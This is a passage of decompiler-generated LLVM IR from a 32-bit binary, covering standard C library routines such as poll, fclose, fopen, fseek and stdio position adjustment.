  uselistorder label %dec_label_pc_80571a8, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80571b0 = load i32, i32* @edi, align 4
  store i32 %v0_80571b0, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80571c0 = load i32, i32* @ebx, align 4
  %v1_80571c1 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80571c8 = call i32 @poll(%pollfd* %v1_80571c1, i32 %tmp3, i32 %tmp)
  store i32 %v0_80571c0, i32* @ebx, align 4
  store i32 %v5_80571c8, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80571c8, -4095
  br i1 %tmp10, label %dec_label_pc_80571e0, label %dec_label_pc_80571d4

dec_label_pc_80571d4:                             ; preds = %entry
  %v1_80571d4 = call i32 @__errno_location(i32 %v0_80571c0)
  %v0_80571d9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80571d9 = sub i32 0, %v0_80571d9
  %v2_80571db = inttoptr i32 %v1_80571d4 to i32*
  store i32 %v1_80571d9, i32* %v2_80571db, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80571e0

dec_label_pc_80571e0:                             ; preds = %entry, %dec_label_pc_80571d4
  %v0_80571e1 = phi i32 [ %v5_80571c8, %entry ], [ -1, %dec_label_pc_80571d4 ]
  %v2_80571e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80571e4, i32* @edi, align 4
  ret i32 %v0_80571e1

; uselistorder directives
  uselistorder i32 %v5_80571c8, { 1, 0, 2 }
  uselistorder i32 %v0_80571c0, { 1, 0 }
  uselistorder label %dec_label_pc_80571e0, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_80571ef = ptrtoint i16* %arg1 to i32
  store i32 %v4_80571ef, i32* @esi, align 4
  %v1_80571f3 = add i32 %v4_80571ef, 52
  %v2_80571f3 = inttoptr i32 %v1_80571f3 to i32*
  %v3_80571f3 = load i32, i32* %v2_80571f3, align 4
  store i32 %v3_80571f3, i32* @ebp, align 4
  %v1_80571f6 = icmp eq i32 %v3_80571f3, 0
  %v1_80571f8 = icmp eq i1 %v1_80571f6, false
  br i1 %v1_80571f8, label %dec_label_pc_8057219, label %dec_label_pc_80571fa

dec_label_pc_80571fa:                             ; preds = %entry
  %v1_80571fa = add i32 %v4_80571ef, 56
  store i32 %v1_80571fa, i32* @ebx, align 4
  %v2_8057204 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057204, i32* @eax, align 4
  %v2_8057209 = call i32 @__pthread_return_void(i32 %v2_8057204, i32 134567263)
  %v0_805720e = load i32, i32* @ebx, align 4
  %v1_8057211 = call i32 @__pthread_return_0(i32 %v0_805720e)
  store i32 %v1_8057211, i32* @eax, align 4
  %v0_805721b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057219

dec_label_pc_8057219:                             ; preds = %entry, %dec_label_pc_80571fa
  %v0_8057223 = phi i32 [ %v4_80571ef, %entry ], [ %v0_805721b.pre, %dec_label_pc_80571fa ]
  store i32 0, i32* @edi, align 4
  %v1_805721b = inttoptr i32 %v0_8057223 to i8*
  %v2_805721b = load i8, i8* %v1_805721b, align 1
  %v3_805721b = and i8 %v2_805721b, 64
  %v4_805721b = icmp eq i8 %v3_805721b, 0
  br i1 %v4_805721b, label %dec_label_pc_8057219.dec_label_pc_805722e_crit_edge, label %dec_label_pc_8057220

dec_label_pc_8057219.dec_label_pc_805722e_crit_edge: ; preds = %dec_label_pc_8057219
  br label %dec_label_pc_805722e

dec_label_pc_8057220:                             ; preds = %dec_label_pc_8057219
  %v1_8057224 = inttoptr i32 %v0_8057223 to i16*
  %v2_8057224 = call i32 @fflush_unlocked(i16* %v1_8057224)
  store i32 %v2_8057224, i32* @edi, align 4
  %v0_8057231.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805722e

dec_label_pc_805722e:                             ; preds = %dec_label_pc_8057219.dec_label_pc_805722e_crit_edge, %dec_label_pc_8057220
  %v0_8057231 = phi i32 [ %v0_8057223, %dec_label_pc_8057219.dec_label_pc_805722e_crit_edge ], [ %v0_8057231.pre, %dec_label_pc_8057220 ]
  %v1_8057231 = add i32 %v0_8057231, 4
  %v2_8057231 = inttoptr i32 %v1_8057231 to i32*
  %v3_8057231 = load i32, i32* %v2_8057231, align 4
  %v1_8057234 = call i32 @__libc_close(i32 %v3_8057231)
  %v0_805723c = load i32, i32* @esi, align 4
  %v1_805723c = add i32 %v0_805723c, 4
  %v2_805723c = inttoptr i32 %v1_805723c to i32*
  store i32 -1, i32* %v2_805723c, align 4
  %v2_805724d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805724d, i32* @ebx, align 4
  %v2_8057252 = icmp slt i32 %v1_8057234, 0
  store i32 -1, i32* @eax, align 4
  %v1_8057259 = load i32, i32* @edi, align 4
  %v3_8057259 = select i1 %v2_8057252, i32 -1, i32 %v1_8057259
  store i32 %v3_8057259, i32* @edi, align 4
  %v2_805725c = call i32 @__pthread_return_void(i32 %v2_805724d, i32 134567263)
  %v1_8057268 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
  %v0_805726d = load i32, i32* @global_var_80624a4.593, align 4
  %v1_8057272 = add i32 %v0_805726d, 1
  store i32 %v1_8057272, i32* @global_var_80624a4.593, align 4
  store i32 ptrtoint (i32* @global_var_805e224.487 to i32), i32* @eax, align 4
  %v2_805727d = call i32 @__pthread_return_void(i32 %v2_805724d, i32 1)
  %v0_8057282 = load i32, i32* @esi, align 4
  %v1_8057282 = inttoptr i32 %v0_8057282 to i32*
  %v2_8057282 = load i32, i32* %v1_8057282, align 4
  %v1_8057287 = and i32 %v2_8057282, 24576
  %v1_805728c = or i32 %v1_8057287, 48
  store i32 %v1_805728c, i32* @eax, align 4
  %v1_8057291 = trunc i32 %v1_805728c to i16
  %v3_8057291 = inttoptr i32 %v0_8057282 to i16*
  store i16 %v1_8057291, i16* %v3_8057291, align 2
  br i1 %v1_80571f8, label %dec_label_pc_80572a7, label %dec_label_pc_8057296

dec_label_pc_8057296:                             ; preds = %dec_label_pc_805722e
  %v2_805729a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805729a, i32* @eax, align 4
  %v2_805729f = call i32 @__pthread_return_void(i32 %v2_805729a, i32 1)
  store i32 %v2_805729f, i32* @eax, align 4
  br label %dec_label_pc_80572a7

dec_label_pc_80572a7:                             ; preds = %dec_label_pc_805722e, %dec_label_pc_8057296
  %v0_80572a7 = load i32, i32* @esi, align 4
  %v1_80572a7 = add i32 %v0_80572a7, 1
  %v2_80572a7 = inttoptr i32 %v1_80572a7 to i8*
  %v3_80572a7 = load i8, i8* %v2_80572a7, align 1
  %v4_80572a7 = and i8 %v3_80572a7, 64
  %v5_80572a7 = icmp eq i8 %v4_80572a7, 0
  br i1 %v5_80572a7, label %dec_label_pc_80572bb, label %dec_label_pc_80572ad

dec_label_pc_80572ad:                             ; preds = %dec_label_pc_80572a7
  %v1_80572b0 = add i32 %v0_80572a7, 8
  %v2_80572b0 = inttoptr i32 %v1_80572b0 to i32*
  %v3_80572b0 = load i32, i32* %v2_80572b0, align 4
  %v1_80572b3 = call i32 @free(i32 %v3_80572b0)
  store i32 %v1_80572b3, i32* @eax, align 4
  br label %dec_label_pc_80572bb

dec_label_pc_80572bb:                             ; preds = %dec_label_pc_80572a7, %dec_label_pc_80572ad
  %v2_80572c7 = call i32 @__pthread_return_void(i32 %v2_805724d, i32 134567263)
  %v1_80572d3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
  store i32 ptrtoint (i32* @global_var_805e224.487 to i32), i32* @eax, align 4
  %v0_80572d9 = load i32, i32* @global_var_80624a8.594, align 8
  %v1_80572d9 = add i32 %v0_80572d9, 1
  store i32 %v1_80572d9, i32* @global_var_80624a8.594, align 8
  %v2_80572e3 = call i32 @__pthread_return_void(i32 %v2_805724d, i32 1)
  %v0_80572e8 = call i32 @_stdio_openlist_dec_use()
  %v0_80572f0 = load i32, i32* @edi, align 4
  ret i32 %v0_80572f0

; uselistorder directives
  uselistorder i32 %v2_805724d, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @__libc_close, { 18, 17, 16, 15, 14, 13, 12, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80572bb, { 1, 0 }
  uselistorder label %dec_label_pc_80572a7, { 1, 0 }
  uselistorder label %dec_label_pc_805722e, { 1, 0 }
  uselistorder label %dec_label_pc_8057219, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8057307 = inttoptr i32 %arg2 to i8*
  %v5_8057307 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_8057307, i32 0, i32 -1)
  ret i32 %v5_8057307
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805731b = ashr i32 %arg2, 31
  %v4_8057322 = inttoptr i32 %arg1 to i16*
  %v5_8057322 = call i32 @__GI_fseeko64(i16* %v4_8057322, i32 %arg2, i32 %v1_805731b, i32 %arg3)
  ret i32 %v5_8057322
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805732c = load i32, i32* @ebp, align 4
  %v0_805732d = load i32, i32* @edi, align 4
  %v0_805732e = load i32, i32* @esi, align 4
  %v0_805732f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_805733f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805733f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8057363, label %dec_label_pc_8057350

dec_label_pc_8057350:                             ; preds = %entry
  %v1_8057350 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8057350, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8057358 = inttoptr i32 %v1_8057350 to i32*
  store i32 22, i32* %v1_8057358, align 4
  br label %dec_label_pc_8057409

dec_label_pc_8057363:                             ; preds = %entry
  %v1_8057363 = add i32 %v4_805733f, 52
  %v2_8057363 = inttoptr i32 %v1_8057363 to i32*
  %v3_8057363 = load i32, i32* %v2_8057363, align 4
  %v1_8057366 = icmp eq i32 %v3_8057363, 0
  %v1_8057368 = icmp eq i1 %v1_8057366, false
  br i1 %v1_8057368, label %dec_label_pc_8057389, label %dec_label_pc_805736a

dec_label_pc_805736a:                             ; preds = %dec_label_pc_8057363
  %v1_805736a = add i32 %v4_805733f, 56
  store i32 %v1_805736a, i32* @ebx, align 4
  %v2_8057374 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8057374, i32* @eax, align 4
  %v3_8057379 = call i32 @__pthread_return_void(i32 %v2_8057374, i32 134567263)
  store i32 %v3_8057379, i32* %eax.global-to-local, align 4
  %v0_805737e = load i32, i32* @ebx, align 4
  %v2_8057381 = call i32 @__pthread_return_0(i32 %v0_805737e)
  store i32 %v2_8057381, i32* %eax.global-to-local, align 4
  %v0_8057389.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057389

dec_label_pc_8057389:                             ; preds = %dec_label_pc_8057363, %dec_label_pc_805736a
  %v0_8057391 = phi i32 [ %v4_805733f, %dec_label_pc_8057363 ], [ %v0_8057389.pre, %dec_label_pc_805736a ]
  %v1_8057389 = inttoptr i32 %v0_8057391 to i8*
  %v2_8057389 = load i8, i8* %v1_8057389, align 1
  %v3_8057389 = and i8 %v2_8057389, 64
  %v4_8057389 = icmp eq i8 %v3_8057389, 0
  br i1 %v4_8057389, label %dec_label_pc_805739e, label %dec_label_pc_805738e

dec_label_pc_805738e:                             ; preds = %dec_label_pc_8057389
  %v2_8057392 = call i32 @__stdio_wcommit(i32 %v0_8057391)
  store i32 %v2_8057392, i32* %eax.global-to-local, align 4
  %v1_805739a = icmp eq i32 %v2_8057392, 0
  %v1_805739c = icmp eq i1 %v1_805739a, false
  br i1 %v1_805739c, label %dec_label_pc_80573f1, label %dec_label_pc_805739e

dec_label_pc_805739e:                             ; preds = %dec_label_pc_805738e, %dec_label_pc_8057389
  %v0_805739e = load i32, i32* @edi, align 4
  %v9_805739e = icmp eq i32 %v0_805739e, 1
  %v1_80573a1 = icmp eq i1 %v9_805739e, false
  br i1 %v1_80573a1, label %dec_label_pc_805739e.dec_label_pc_80573b7_crit_edge, label %dec_label_pc_80573a3

dec_label_pc_805739e.dec_label_pc_80573b7_crit_edge: ; preds = %dec_label_pc_805739e
  %.pre7 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80573b7

dec_label_pc_80573a3:                             ; preds = %dec_label_pc_805739e
  %v0_80573a3 = load i32, i32* @ecx, align 4
  %v2_80573a5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80573a5, i32* %eax.global-to-local, align 4
  %v0_80573aa = load i32, i32* @esi, align 4
  %v5_80573aa = inttoptr i32 %v0_80573aa to i16*
  %v6_80573ab = call i32 @__stdio_adjust_position(i16* %v5_80573aa, i32 %v2_80573a5, i32 %v0_80573a3, i32 %v0_80573a3)
  store i32 %v6_80573ab, i32* %eax.global-to-local, align 4
  %v2_80573b3 = icmp slt i32 %v6_80573ab, 0
  br i1 %v2_80573b3, label %dec_label_pc_80573f1, label %dec_label_pc_80573a3.dec_label_pc_80573b7_crit_edge

dec_label_pc_80573a3.dec_label_pc_80573b7_crit_edge: ; preds = %dec_label_pc_80573a3
  %v0_80573b8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80573b7

dec_label_pc_80573b7:                             ; preds = %dec_label_pc_805739e.dec_label_pc_80573b7_crit_edge, %dec_label_pc_80573a3.dec_label_pc_80573b7_crit_edge
  %v2_80573b9.pre-phi = phi i32 [ %.pre7, %dec_label_pc_805739e.dec_label_pc_80573b7_crit_edge ], [ %v2_80573a5, %dec_label_pc_80573a3.dec_label_pc_80573b7_crit_edge ]
  %v0_80573b8 = phi i32 [ %v0_805739e, %dec_label_pc_805739e.dec_label_pc_80573b7_crit_edge ], [ %v0_80573b8.pre, %dec_label_pc_80573a3.dec_label_pc_80573b7_crit_edge ]
  %v0_80573b7 = load i32, i32* @edx, align 4
  store i32 %v2_80573b9.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80573be = load i32, i32* @esi, align 4
  %v5_80573bf = inttoptr i32 %v2_80573b9.pre-phi to i32*
  %v6_80573bf = call i32 @__stdio_seek(i32 %v0_80573be, i32* %v5_80573bf, i32 %v0_80573b8, i32 %v0_80573b7)
  store i32 %v6_80573bf, i32* %eax.global-to-local, align 4
  %v2_80573c7 = icmp slt i32 %v6_80573bf, 0
  br i1 %v2_80573c7, label %dec_label_pc_80573f1, label %dec_label_pc_80573cb

dec_label_pc_80573cb:                             ; preds = %dec_label_pc_80573b7
  %v0_80573cb = load i32, i32* @esi, align 4
  %v1_80573cb = inttoptr i32 %v0_80573cb to i32*
  %v2_80573cb = load i32, i32* %v1_80573cb, align 4
  store i32 %v2_80573cb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80573cf = add i32 %v0_80573cb, 44
  %v2_80573cf = inttoptr i32 %v1_80573cf to i32*
  store i32 0, i32* %v2_80573cf, align 4
  %v0_80573d6 = load i32, i32* @esi, align 4
  %v1_80573d6 = add i32 %v0_80573d6, 2
  %v2_80573d6 = inttoptr i32 %v1_80573d6 to i8*
  store i8 0, i8* %v2_80573d6, align 1
  %v0_80573da = load i32, i32* %eax.global-to-local, align 4
  %v1_80573da = and i32 %v0_80573da, -72
  store i32 %v1_80573da, i32* %eax.global-to-local, align 4
  %v1_80573dd = trunc i32 %v1_80573da to i16
  %v2_80573dd = load i32, i32* @esi, align 4
  %v3_80573dd = inttoptr i32 %v2_80573dd to i16*
  store i16 %v1_80573dd, i16* %v3_80573dd, align 2
  %v0_80573e0 = load i32, i32* @esi, align 4
  %v1_80573e0 = add i32 %v0_80573e0, 8
  %v2_80573e0 = inttoptr i32 %v1_80573e0 to i32*
  %v3_80573e0 = load i32, i32* %v2_80573e0, align 4
  store i32 %v3_80573e0, i32* %eax.global-to-local, align 4
  %v2_80573e3 = add i32 %v0_80573e0, 16
  %v3_80573e3 = inttoptr i32 %v2_80573e3 to i32*
  store i32 %v3_80573e0, i32* %v3_80573e3, align 4
  %v0_80573e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80573e6 = load i32, i32* @esi, align 4
  %v2_80573e6 = add i32 %v1_80573e6, 20
  %v3_80573e6 = inttoptr i32 %v2_80573e6 to i32*
  store i32 %v0_80573e6, i32* %v3_80573e6, align 4
  %v0_80573e9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80573e9 = load i32, i32* @esi, align 4
  %v2_80573e9 = add i32 %v1_80573e9, 24
  %v3_80573e9 = inttoptr i32 %v2_80573e9 to i32*
  store i32 %v0_80573e9, i32* %v3_80573e9, align 4
  %v0_80573ec = load i32, i32* %eax.global-to-local, align 4
  %v1_80573ec = load i32, i32* @esi, align 4
  %v2_80573ec = add i32 %v1_80573ec, 28
  %v3_80573ec = inttoptr i32 %v2_80573ec to i32*
  store i32 %v0_80573ec, i32* %v3_80573ec, align 4
  br label %dec_label_pc_80573f4

dec_label_pc_80573f1:                             ; preds = %dec_label_pc_80573b7, %dec_label_pc_80573a3, %dec_label_pc_805738e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80573f4

dec_label_pc_80573f4:                             ; preds = %dec_label_pc_80573cb, %dec_label_pc_80573f1
  br i1 %v1_8057368, label %dec_label_pc_8057409, label %dec_label_pc_80573f8

dec_label_pc_80573f8:                             ; preds = %dec_label_pc_80573f4
  %v2_80573fc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80573fc, i32* @eax, align 4
  %v3_8057401 = call i32 @__pthread_return_void(i32 %v2_80573fc, i32 1)
  store i32 %v3_8057401, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057409

dec_label_pc_8057409:                             ; preds = %dec_label_pc_80573f4, %dec_label_pc_8057350, %dec_label_pc_80573f8
  %v0_805740c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805740c, i32* %eax.global-to-local, align 4
  store i32 %v0_805732f, i32* @ebx, align 4
  store i32 %v0_805732e, i32* @esi, align 4
  store i32 %v0_805732d, i32* @edi, align 4
  store i32 %v0_805732c, i32* @ebp, align 4
  ret i32 %v0_805740c

; uselistorder directives
  uselistorder i32 %v2_80573b9.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805739e, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057409, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80573f4, { 1, 0 }
  uselistorder label %dec_label_pc_80573b7, { 1, 0 }
  uselistorder label %dec_label_pc_8057389, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_805741c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805741c, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8057424 = load i16, i16* %arg1, align 2
  %v3_8057424 = zext i16 %v2_8057424 to i32
  store i32 %v3_8057424, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8057424, 4
  %v1_8057429 = zext i16 %tmp to i32
  %v2_8057429 = icmp eq i16 %tmp, 0
  br i1 %v2_8057429, label %dec_label_pc_8057458, label %dec_label_pc_805742e

dec_label_pc_805742e:                             ; preds = %entry
  %v1_8057430 = add nsw i32 %v1_8057429, -1
  %v8_8057430 = icmp eq i32 %v1_8057430, 0
  store i32 %v1_8057430, i32* @edx, align 4
  br i1 %v8_8057430, label %dec_label_pc_8057458, label %dec_label_pc_8057433

dec_label_pc_8057433:                             ; preds = %dec_label_pc_805742e
  %v3_8057433 = and i32 %v3_8057424, 2048
  %v4_8057433 = icmp eq i32 %v3_8057433, 0
  br i1 %v4_8057433, label %dec_label_pc_8057458, label %dec_label_pc_8057438

dec_label_pc_8057438:                             ; preds = %dec_label_pc_8057433
  %v6_8057438 = sub nsw i32 1, %v1_8057429
  %v7_8057438 = and i32 %v1_8057430, %v6_8057438
  %v8_8057438 = icmp slt i32 %v7_8057438, 0
  %v9_8057438 = icmp eq i16 %tmp, 2
  %v10_8057438 = icmp ult i16 %tmp, 2
  %v3_805743b = icmp eq i1 %v10_8057438, %v8_8057438
  %v4_805743b = icmp eq i1 %v9_8057438, false
  %v5_805743b = and i1 %v4_805743b, %v3_805743b
  br i1 %v5_805743b, label %dec_label_pc_80574ac, label %dec_label_pc_805743d

dec_label_pc_805743d:                             ; preds = %dec_label_pc_8057438
  %v1_805743d = add i32 %v4_805741c, 40
  %v2_805743d = inttoptr i32 %v1_805743d to i32*
  %v3_805743d = load i32, i32* %v2_805743d, align 4
  %v4_805743d = icmp eq i32 %v3_805743d, 0
  %v1_8057441 = icmp eq i1 %v4_805743d, false
  br i1 %v1_8057441, label %dec_label_pc_80574ac, label %dec_label_pc_8057443

dec_label_pc_8057443:                             ; preds = %dec_label_pc_805743d
  %v1_8057443 = add i32 %v4_805741c, 3
  %v2_8057443 = inttoptr i32 %v1_8057443 to i8*
  %v3_8057443 = load i8, i8* %v2_8057443, align 1
  %v4_8057443 = zext i8 %v3_8057443 to i32
  %v2_8057447 = sub nsw i32 %v1_8057430, %v4_8057443
  %v1_8057449 = add i32 %v4_805741c, 44
  %v2_8057449 = inttoptr i32 %v1_8057449 to i32*
  %v3_8057449 = load i32, i32* %v2_8057449, align 4
  %v1_805744d = add nsw i32 %v2_8057447, -1
  %tmp11 = icmp slt i32 %v3_8057449, 1
  br i1 %tmp11, label %dec_label_pc_8057458, label %dec_label_pc_8057452

dec_label_pc_8057452:                             ; preds = %dec_label_pc_8057443
  %v1_8057452 = add i32 %v4_805741c, 2
  %v2_8057452 = inttoptr i32 %v1_8057452 to i8*
  %v3_8057452 = load i8, i8* %v2_8057452, align 1
  %v4_8057452 = zext i8 %v3_8057452 to i32
  %v2_8057456 = sub nsw i32 %v1_805744d, %v4_8057452
  br label %dec_label_pc_8057458

dec_label_pc_8057458:                             ; preds = %dec_label_pc_8057443, %dec_label_pc_8057433, %dec_label_pc_805742e, %entry, %dec_label_pc_8057452
  %v0_805746d = phi i32 [ %v1_805744d, %dec_label_pc_8057443 ], [ %v1_8057430, %dec_label_pc_8057433 ], [ 0, %dec_label_pc_805742e ], [ 0, %entry ], [ %v2_8057456, %dec_label_pc_8057452 ]
  %v2_8057458 = and i32 %v3_8057424, 64
  %v3_8057458 = icmp eq i32 %v2_8057458, 0
  %storemerge.in.in.v = select i1 %v3_8057458, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_805741c
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8057465 = add i32 %v4_805741c, 16
  %v3_8057465 = inttoptr i32 %v2_8057465 to i32*
  %v4_8057465 = load i32, i32* %v3_8057465, align 4
  %v5_8057465 = sub i32 %storemerge, %v4_8057465
  %v1_8057468 = inttoptr i32 %arg2 to i32*
  %v2_8057468 = load i32, i32* %v1_8057468, align 4
  store i32 %v2_8057468, i32* %ecx.global-to-local, align 4
  %v1_805746a = add i32 %arg2, 4
  %v2_805746a = inttoptr i32 %v1_805746a to i32*
  %v3_805746a = load i32, i32* %v2_805746a, align 4
  store i32 %v3_805746a, i32* %ebx.global-to-local, align 4
  %v2_805746d = add i32 %v5_8057465, %v0_805746d
  store i32 %v2_805746d, i32* %esi.global-to-local, align 4
  %v5_8057481 = sub i32 %v2_8057468, %v2_805746d
  %v10_8057481 = icmp ult i32 %v2_8057468, %v2_805746d
  %v6_8057485 = zext i1 %v10_8057481 to i32
  %tmp13 = icmp slt i32 %v2_805746d, 0
  %v2_8057472.neg = zext i1 %tmp13 to i32
  %v7_8057485 = add i32 %v3_805746a, %v2_8057472.neg
  %v8_8057485 = add i32 %v7_8057485, %v6_8057485
  store i32 %v8_8057485, i32* @edx, align 4
  store i32 %v5_8057481, i32* %v1_8057468, align 4
  %v0_805748b = load i32, i32* @edx, align 4
  %v1_805748b = load i32, i32* %edi.global-to-local, align 4
  %v2_805748b = add i32 %v1_805748b, 4
  %v3_805748b = inttoptr i32 %v2_805748b to i32*
  store i32 %v0_805748b, i32* %v3_805748b, align 4
  %v0_805748e = load i32, i32* %edi.global-to-local, align 4
  %v1_805748e = add i32 %v0_805748e, 4
  %v2_805748e = inttoptr i32 %v1_805748e to i32*
  %v3_805748e = load i32, i32* %v2_805748e, align 4
  %v4_805748e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8057491 = icmp slt i32 %v3_805748e, %v4_805748e
  br i1 %v5_8057491, label %dec_label_pc_805749b, label %dec_label_pc_8057493

dec_label_pc_8057493:                             ; preds = %dec_label_pc_8057458
  %v8_8057493 = icmp sgt i32 %v3_805748e, %v4_805748e
  br i1 %v8_8057493, label %dec_label_pc_8057499, label %dec_label_pc_8057495

dec_label_pc_8057495:                             ; preds = %dec_label_pc_8057493
  %v1_8057495 = inttoptr i32 %v0_805748e to i32*
  %v2_8057495 = load i32, i32* %v1_8057495, align 4
  %v3_8057495 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8057495, %v3_8057495
  br i1 %tmp14, label %dec_label_pc_8057499, label %dec_label_pc_805749b

dec_label_pc_8057499:                             ; preds = %dec_label_pc_8057495, %dec_label_pc_8057493
  %v0_8057499 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057499 = sub i32 0, %v0_8057499
  store i32 %v1_8057499, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805749b

dec_label_pc_805749b:                             ; preds = %dec_label_pc_8057495, %dec_label_pc_8057458, %dec_label_pc_8057499
  %v0_805749b = load i32, i32* %esi.global-to-local, align 4
  %v2_805749b = icmp slt i32 %v0_805749b, 0
  %v1_805749d = icmp eq i1 %v2_805749b, false
  br i1 %v1_805749d, label %dec_label_pc_80574af, label %dec_label_pc_805749f

dec_label_pc_805749f:                             ; preds = %dec_label_pc_805749b
  %v1_805749f = call i32 @__errno_location(i32 %v2_805746d)
  %v1_80574a4 = inttoptr i32 %v1_805749f to i32*
  store i32 75, i32* %v1_80574a4, align 4
  %v0_80574b2.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80574af

dec_label_pc_80574ac:                             ; preds = %dec_label_pc_805743d, %dec_label_pc_8057438
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80574af

dec_label_pc_80574af:                             ; preds = %dec_label_pc_805749b, %dec_label_pc_805749f, %dec_label_pc_80574ac
  %v0_80574b2 = phi i32 [ %v0_805749b, %dec_label_pc_805749b ], [ %v0_80574b2.pre, %dec_label_pc_805749f ], [ -1, %dec_label_pc_80574ac ]
  ret i32 %v0_80574b2

; uselistorder directives
  uselistorder i32 %v4_805748e, { 1, 0 }
  uselistorder i32 %v3_805748e, { 1, 0 }
  uselistorder i32 %v2_805746d, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8057430, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_805741c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 3, 2, 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 8, 9, 7, 10, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80574af, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805749b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057458, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80574b8 = load i32, i32* @ebp, align 4
  %v0_80574b9 = load i32, i32* @edi, align 4
  %v0_80574ba = load i32, i32* @esi, align 4
  %v0_80574bb = load i32, i32* @ebx, align 4
  store i32 %v0_80574bb, i32* %stack_var_-16, align 4
